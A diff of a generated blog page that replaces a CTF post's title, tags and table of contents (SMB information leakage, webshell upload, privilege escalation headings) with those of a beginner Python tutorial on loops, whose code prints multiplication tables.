class="line"></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#左下角</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,i+<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>*<span class="subst">&#123;j&#125;</span>=<span class="subst">&#123;i*j&#125;</span>&quot;</span>,end = <span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()  </span><br><span class="line">    </span><br><span class="line"><span class="comment">#右下角</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>,i,-<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(end = <span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,i+<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>*<span class="subst">&#123;j&#125;</span>=<span class="subst">&#123;i*j&#125;</span>&quot;</span>,end = <span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
         </div>
 
@@ -690,18 +766,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> SambaSMB信息泄露（Serve Message Block)</li>
+        <li><strong>Title:</strong> Python从入门到精通——3.2 循环结构</li>
         <li><strong>Author:</strong> Dunm1e</li>
         <li><strong>Created at
-                :</strong> 2024-09-11 18:53:11</li>
+                :</strong> 2024-09-29 18:26:37</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-12 08:18:13
+                    :</strong> 2024-10-09 23:42:10
             </li>
         
         <li>
-            <strong>Link:</strong> https://dunm1e.github.io/2024/09/11/cfb8804dd1b5/
+            <strong>Link:</strong> https://dunm1e.github.io/2024/09/29/3670918b968d/
         </li>
         <li>
             <strong>
@@ -723,11 +799,11 @@
             <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                        <a href="/tags/python/">#python</a>&nbsp;
                     </li>
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/SMB/">#SMB</a>&nbsp;
+                        <a href="/tags/%E5%9F%BA%E7%A1%80/">#基础</a>&nbsp;
                     </li>
                 
             </ul>
@@ -738,29 +814,14 @@
         
             <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                 
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2024/09/11/3bc19a255208/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">sql注入（IP命令行）</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/09/11/602e2b077e4b/"
+                        href="/2024/09/28/98a7c719df5e/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">FTP服务后门利用</span>
+                                <span class="post-nav-title-item">Python从入门到精通——3. 1 分支结构</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -823,8 +884,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">SambaSMB信息泄露（Serve Message Block)</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Samba-SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-text">Samba&#x2F;SMB信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="nav-text">信息探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%92%88%E5%AF%B9SMB%E5%8D%8F%E8%AE%AE%E5%BC%B1%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-text">针对SMB协议弱点分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%92%88%E5%AF%B9HTTP%E5%8D%8F%E8%AE%AE%E5%BC%B1%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-text">针对HTTP协议弱点分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%AB%99"><span class="nav-text">1. 浏览器查看网站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8dirb-nicko%E6%89%AB%E6%8F%8F"><span class="nav-text">2. 使用dirb nicko扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%B8%8A%E4%BC%A0webshell"><span class="nav-text">3.上传webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="nav-text">4. 提升权限</span></a></li></ol></li></ol></li></ol>
+        <div class="page-title">Python从入门到精通——3.2 循环结构</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#while%E5%BE%AA%E7%8E%AF"><span class="nav-text">while循环</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#while-else-%E8%AF%AD%E5%8F%A5"><span class="nav-text">while else 语句</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#for%E5%BE%AA%E7%8E%AF"><span class="nav-text">for循环</span></a></li></ol>
 
     </div>
 </div>
